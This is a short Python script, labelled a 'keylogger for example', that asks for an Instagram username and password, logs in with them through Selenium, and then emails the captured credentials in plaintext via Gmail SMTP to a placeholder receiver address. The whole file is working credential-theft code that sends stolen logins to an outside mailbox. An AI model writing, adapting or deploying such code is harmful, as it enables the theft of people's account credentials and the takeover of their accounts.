import os,platform,time

try:
	from selenium import webdriver
	from selenium.webdriver.common.keys import Keys
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
except:
	os.system("pip install selenium")



def Instagram_Browser():
	username = str(input(" [*] Enter to Username -> "))
	password = str(input(" [*] Enter to Password -> "))
	browser = webdriver.Chrome('chromedriver.exe')
	browser.get("https://www.instagram.com")
	time.sleep(1)
	username_path = browser.find_element_by_xpath("//*[@id='react-root']/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input")
	username_path.send_keys(username)
	time.sleep(1)
	password_path = browser.find_element_by_xpath("//*[@id='react-root']/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input")
	password_path.send_keys(password)
	time.sleep(1)
	time.sleep(1)
	login_btn = browser.find_element_by_xpath("//*[@id='react-root']/section/main/article/div[2]/div[1]/div/form/div[4]/button")
	login_btn.click()
	time.sleep(5)
	Send_Email(username,password)


def Send_Email(username,password):
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.ehlo()
	server.starttls()
	server.login("your_email","your_password")
	message = "Subject : Account Information:{send_username} \n \n {send_password}".format(send_username=username,send_password=password)
	server.sendmail("your_email","receiver_email",message)
	server.quit()

if __name__ == '__main__':
	
	os_check = platform.system()
	if os_check == "Windows":
		os.system("cls")
	elif os_check == "Linux":
		os.system("clear")

	print('''
	
	PYTHON KEYLOGGER FOR EXAMPLE
	
	Author: @coder.gurkan

		''')

	Instagram_Browser()